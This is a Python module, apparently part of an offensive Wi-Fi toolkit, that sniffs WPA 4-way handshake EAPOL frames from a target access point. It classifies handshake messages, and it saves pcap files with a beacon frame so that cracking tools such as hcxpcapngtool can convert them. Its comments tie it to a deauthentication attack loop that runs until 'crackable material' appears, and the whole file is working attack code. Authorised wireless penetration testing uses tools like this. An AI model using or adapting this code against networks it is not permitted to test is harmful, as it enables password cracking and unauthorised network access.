"""Capture WPA 4-way handshake EAPOL frames until a crackable pair is seen.

Classification: a pair with only M1+M2 is CHALLENGE — unverified, since
the AP never confirmed the client's MIC — while M2+M3 is AUTHORIZED,
since the AP itself validated the proof before replying with M3.
CHALLENGE is real, crackable material — deauth loops may stop on it too
(see attacks/logic.py's meets_threshold(); History.md, 2026-09-13). This
module's own stop_filter below stays AUTHORIZED-only on purpose: that
governs passive listening, not attacking, and costs nothing to keep
running a bit longer for the stronger confirmation.
"""

from __future__ import annotations

import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path

from scapy.data import DLT_IEEE802_11_RADIO
from scapy.layers.dot11 import Dot11Beacon, Dot11ProbeResp
from scapy.layers.eap import EAPOL
from scapy.sendrecv import AsyncSniffer
from scapy.utils import PcapWriter

from ..frames import eapol_key_info, is_eapol
from ..radio import ensure_channel


class HandshakeStatus(Enum):
    """Capture quality for one (AP, client) pair."""

    NONE = "none"
    CHALLENGE = "challenge"
    AUTHORIZED = "authorized"


@dataclass
class HandshakeCapture:
    """Tracks EAPOL messages 1-4 seen per (AP, client) pair.

    M4 is recorded (as 4) only so it is never mistaken for M2 -- both
    have identical ack/mic flag bits, but only a real M2 is crackable
    material; status() below deliberately ignores 4."""

    messages: dict[tuple[str, str], set[int]] = field(default_factory=dict)

    def add(self, ap: str, client: str, msg_no: int) -> None:
        """Record a handshake message number for a pair."""
        self.messages.setdefault((ap, client), set()).add(msg_no)

    def status(self, ap: str, client: str) -> HandshakeStatus:
        """Classify a pair's capture quality."""
        seen = self.messages.get((ap, client), set())
        if {2, 3} <= seen:
            return HandshakeStatus.AUTHORIZED
        if {1, 2} <= seen:
            return HandshakeStatus.CHALLENGE
        return HandshakeStatus.NONE

    def complete(self, ap: str, client: str) -> bool:
        """True once any crackable material (CHALLENGE or AUTHORIZED) is held."""
        return self.status(ap, client) is not HandshakeStatus.NONE

    def authorized(self, ap: str, client: str) -> bool:
        """True only once the AP itself confirmed proof (M3 seen).

        Used by this module's own stop_filter (passive listening only —
        see the module docstring). Attack loops deciding whether to keep
        deauthing should use attacks/logic.py's meets_threshold() instead.
        """
        return self.status(ap, client) is HandshakeStatus.AUTHORIZED


def _looks_like_m4(pkt) -> bool:
    """Distinguish M4 from M2 -- both have ack=0/mic=1, so the flag bits
    alone (eapol_key_info) can't tell them apart, and recording a lone M4
    as M2 produces phantom CHALLENGE (M1+M4) / AUTHORIZED (M3+M4) states.

    Differences on the wire: M2 carries the station's RSN IE in its key
    data (non-empty), M4's key data is empty; and M4 sets the Secure bit
    (0x0200 in key_info, keys already installed) while M2 doesn't.
    """
    if not is_eapol(pkt):
        return False
    eapol = pkt.getlayer(EAPOL)
    if eapol is None:
        return False
    raw = bytes(eapol.payload)
    if len(raw) < 95:  # descriptor(1)+key_info(2)+...+mic(16)+key_data_len(2)
        return False
    key_info = int.from_bytes(raw[1:3], "big")
    key_data_len = int.from_bytes(raw[93:95], "big")
    return bool(key_info & 0x0200) or key_data_len == 0


def _classify(pkt) -> int | None:
    """Return handshake message number (1-4) or None."""
    info = eapol_key_info(pkt)
    if info is None:
        return None
    mic_set, ack_set = info
    if ack_set and not mic_set:
        return 1
    if not ack_set and mic_set:
        return 4 if _looks_like_m4(pkt) else 2
    if ack_set and mic_set:
        return 3
    return None


def capture_handshake(
    iface: str,
    bssid: str,
    channel: int | None = None,
    timeout: float = 60.0,
    outfile: str | None = None,
    stop_event=None,
    progress_fn=None,
    cap: HandshakeCapture | None = None,
) -> HandshakeCapture:
    """Sniff EAPOL frames for bssid until a complete pair, timeout, or
    stop_event fires.

    Uses AsyncSniffer rather than blocking sniff() so an external
    stop_event can actually abort the capture. Without this, a caller
    that wants to cancel mid-capture (e.g. OmniOrchestrator.stop()) has
    no way to reclaim the interface — the sniffer keeps running for the
    rest of `timeout` in the background even after the caller has moved
    on, holding the raw socket open the whole time.

    cap: an existing HandshakeCapture to fill in place instead of a
    fresh one. This function normally runs on a background thread and
    only returns once the whole listen window ends -- a caller that
    needs to observe progress *while it's still running* (e.g.
    attacks/logic.py's run_deauth_flow, to stop sending deauth as soon
    as CHALLENGE material appears) has to pass in the object it intends
    to poll: add() mutates it in place, so the caller's own reference
    sees every update immediately, not just the final return value.
    """
    log = progress_fn or (lambda msg: None)
    if ensure_channel(iface, channel):
        log(f"channel set to {channel}")
    log(f"listening for EAPOL on {bssid} (up to {timeout:.0f}s)...")
    cap = cap if cap is not None else HandshakeCapture()
    # linktype forced explicitly: without it, PcapWriter guesses from the
    # first packet's own .linktype attribute and warns + silently falls
    # back to Ethernet ("unknown LL type for NoneType. Using type 1
    # (Ethernet)") whenever that's absent — not just a noisy warning, the
    # capture file's header would then claim Ethernet framing while
    # actually containing raw 802.11/RadioTap frames, which is wrong data
    # for any downstream tool (aircrack-ng, hcxpcapngtool, Wireshark) to
    # parse. Monitor-mode sniffs always come back RadioTap-wrapped, so the
    # correct type is DLT_IEEE802_11_RADIO, always, not a guess.
    writer = PcapWriter(outfile, linktype=DLT_IEEE802_11_RADIO, append=True, sync=True) if outfile else None
    beacon_written = False

    def handler(pkt) -> None:
        nonlocal beacon_written
        if not pkt.addr3 or pkt.addr3.lower() != bssid.lower():
            return
        # hcxpcapngtool refuses to convert an EAPOL-only capture -- it needs
        # a beacon or probe-response frame too, since that's the only place
        # the ESSID (mandatory for PMK computation) lives. Grab exactly one,
        # the first seen, alongside the EAPOL frames -- beacons arrive every
        # ~100ms so this is essentially free during any real listen window.
        if writer and not beacon_written and (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)):
            writer.write(pkt)
            beacon_written = True
            log("beacon frame captured (carries the ESSID needed for hash conversion)")
        msg_no = _classify(pkt)
        if msg_no is None:
            return
        ap, client = pkt.addr3, pkt.addr1 if msg_no % 2 == 1 else pkt.addr2
        is_new = msg_no not in cap.messages.get((ap, client), set())
        cap.add(ap, client, msg_no)
        if is_new:
            log(f"EAPOL M{msg_no} seen (client {client}) -> {cap.status(ap, client).value}")
        if writer:
            writer.write(pkt)

    def stop_filter(pkt) -> bool:
        # Only an AUTHORIZED pair (AP confirmed via M3) ends the sniff early;
        # CHALLENGE-only (M1+M2) keeps listening in case M3 still arrives.
        return any(cap.authorized(ap, cl) for ap, cl in cap.messages)

    sniffer = AsyncSniffer(iface=iface, prn=handler, stop_filter=stop_filter, store=False)
    sniffer.start()
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if stop_event is not None and stop_event.is_set():
            break
        if not sniffer.thread or not sniffer.thread.is_alive():
            break  # stop_filter already ended the sniff (AUTHORIZED capture)
        time.sleep(0.2)
    try:
        sniffer.stop()
    except Exception:  # noqa: BLE001, S110 - stop can race with thread teardown
        pass
    if writer:
        writer.close()
    if not cap.messages:
        log("no EAPOL frames seen for this BSSID")
        # Trash: a deauth round that got no reconnect at all (or just a lone
        # beacon frame with zero handshake material) is worthless downstream
        # -- nothing to crack, ever. Discard it here rather than letting the
        # capture folder fill up with empty files from every failed round.
        # CHALLENGE-only captures (M1+M2, no M3) are NOT trash -- they're
        # still real, potentially crackable material -- so this only fires
        # when cap.messages is completely empty.
        if outfile:
            try:
                Path(outfile).unlink()
                log(f"discarded empty capture file ({outfile})")
            except OSError:
                pass
    return cap
